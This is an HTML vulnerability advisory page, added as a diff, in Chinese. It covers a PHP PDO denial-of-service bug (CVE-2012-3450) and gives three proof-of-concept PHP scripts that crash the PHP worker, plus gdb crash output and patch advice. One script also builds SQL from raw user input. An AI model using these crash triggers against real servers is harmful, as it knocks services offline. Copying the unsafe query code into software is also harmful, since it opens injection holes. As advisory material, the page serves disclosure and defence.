@@ -1,0 +1,422 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/l.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP PDO内存访问冲突拒绝服务漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									PHP是一种HTML内嵌式的语言，PHP与微软的ASP颇有几分相似，都是一种在服务器端执行的嵌入HTML文档的脚本语言，语言的风格有类似于C语言，现在被很多的网站编程人员广泛的运用。<br />
+
+									<br />
+
+									PHP 5.4.3及其他版本在实现上存在远程拒绝服务漏洞，攻击者可利用此漏洞造成Web服务器崩溃，拒绝服务合法用户。<br />
+
+									<br />
+
+									&lt;*来源：0x721427D8<br />
+
+									  *&gt;<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									测试方法：<br />
+
+									警 告<br />
+
+									<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+
+									<br />
+
+									0x721427D8 （）提供了如下测试方法：<br />
+
+									<br />
+
+									<br />
+
+									&lt;?php<br />
+
+									try {<br />
+
+									$db = new PDO(&#39;mysql:host=localhost;dbname=aws&#39;, &quot;root&quot;, &quot;&quot;);<br />
+
+									//tokens: <br />
+
+									// SELECT;*;from;&#39;user&#39;;/*<br />
+
+									//$sql = &quot;SELECT * from &#39;user&#39;/*&quot;;<br />
+
+									$stmt = $db-&gt;prepare(&quot;SELECT * from &#39;user&#39;&quot;.mysql_real_escape_string($_GET[&#39;query&#39;]));<br />
+
+									$stmt-&gt;execute();<br />
+
+									//crash<br />
+
+									$stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);<br />
+
+									$stmt-&gt;fetch(PDO::FETCH_BOUND);<br />
+
+									print_r( $type);<br />
+
+									}<br />
+
+									catch (Exception $e)<br />
+
+									{<br />
+
+									echo &quot;Failed: &quot; . $e-&gt;getMessage();<br />
+
+									}<br />
+
+									?&gt;<br />
+
+									-----<br />
+
+									&lt;?php<br />
+
+									try {<br />
+
+									$db = new PDO(&#39;mysql:host=localhost;dbname=aws&#39;, &quot;root&quot;, &quot;&quot;);<br />
+
+									<br />
+
+									//tokens:<br />
+
+									// SELECT;*;from;&#39;user&#39;;/* <br />
+
+									$sql = &quot;:/*&quot;;<br />
+
+									<br />
+
+									$stmt = $db-&gt;prepare($sql);<br />
+
+									$stmt-&gt;execute();     // crashes php worker in pdo_parse_params()<br />
+
+									<br />
+
+									$stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);<br />
+
+									$stmt-&gt;fetch(PDO::FETCH_BOUND);<br />
+
+									print_r( $type);<br />
+
+									<br />
+
+									} catch (Exception $e) {<br />
+
+									  echo &quot;Failed: &quot; . $e-&gt;getMessage();<br />
+
+									}<br />
+
+									<br />
+
+									?&gt;<br />
+
+									---<br />
+
+									<br />
+
+									&lt;pre&gt;<br />
+
+									&lt;?php<br />
+
+									echo &quot;hmm beginning\n&quot;;<br />
+
+									try {<br />
+
+									$db = new PDO(&#39;mysql:host=localhost;dbname=aws&#39;, &quot;root&quot;, &quot;&quot;);<br />
+
+									echo &quot;lets get it on\n&quot;;<br />
+
+									//tokens:<br />
+
+									// SELECT;*;from;&#39;user&#39;;/* <br />
+
+									$sql = &quot;SELECT * from user :/**&quot;;<br />
+
+									echo $sql;<br />
+
+									$stmt = $db-&gt;prepare($sql);<br />
+
+									echo &quot;prepared :)\n&quot;;<br />
+
+									print_r($stmt);<br />
+
+									$stmt-&gt;execute();     // crashes php worker in pdo_parse_params()<br />
+
+									print_r($stmt);<br />
+
+									echo &quot;executed :(\n&quot;;<br />
+
+									$stmt-&gt;bindColumn(2, $type, PDO::PARAM_STR, 256);<br />
+
+									$stmt-&gt;fetch(PDO::FETCH_BOUND);<br />
+
+									echo &quot;--data-\n&quot;;<br />
+
+									print_r( $type);<br />
+
+									echo &quot;--data--\n&quot;;<br />
+
+									<br />
+
+									} catch (Exception $e) {<br />
+
+									        echo &quot;EXCEPTION&quot;;<br />
+
+									  echo &quot;Failed: &quot; . $e-&gt;getMessage();<br />
+
+									}<br />
+
+									echo &quot;hmmm end\n&quot;;<br />
+
+									?&gt;<br />
+
+									&lt;/pre&gt;<br />
+
+									<br />
+
+									Actual result:<br />
+
+									--------------<br />
+
+									root@bt:/opt/lampp# gdb ./bin/php <br />
+
+									(gdb) run poc_pdo_linux_short_1.php<br />
+
+									Starting program: /opt/lampp/bin/php /opt/lampp/poc_pdo_linux_short_1.php<br />
+
+									[Thread debugging using libthread_db enabled]<br />
+
+									<br />
+
+									Program received signal SIGSEGV, Segmentation fault.<br />
+
+									0x08228a81 in ?? ()<br />
+
+									(gdb) bt<br />
+
+									#0  0x08228a81 in ?? ()<br />
+
+									#1  0x082280eb in pdo_parse_params ()<br />
+
+									#2  0x08223891 in ?? ()<br />
+
+									#3  0x084b2aad in ?? ()<br />
+
+									#4  0x084b1f87 in execute ()<br />
+
+									#5  0x08490ed2 in zend_execute_scripts ()<br />
+
+									#6  0x0843f13c in php_execute_script ()<br />
+
+									#7  0x08506b46 in main ()<br />
+
+									<br />
+
+									建议：<br />
+
+									厂商补丁：<br />
+
+									<br />
+
+									PHP<br />
+
+									---<br />
+
+									建议升级PHP产品至最新版本，请到厂商的主页下载：<br />
+
+									<br />
+
+									http://www.php.net<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>2</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2012-08-06</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-08-09</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>CVE</th>
+
+								<td>
+
+									<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3450" target="_blank">CVE-2012-3450</a>&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/54777" target="_blank">54777</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=20236" target="_blank">20236</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNNVD编号</th>
+
+								<td>
+
+									CNNVD-201208-017&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNCVE编号</th>
+
+								<td>
+
+									CNCVE-20123450&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CVSS评分</th>
+
+								<td>
+
+									2.6&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNVD编号</th>
+
+								<td>
+
+									CNVD-2012-8431&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
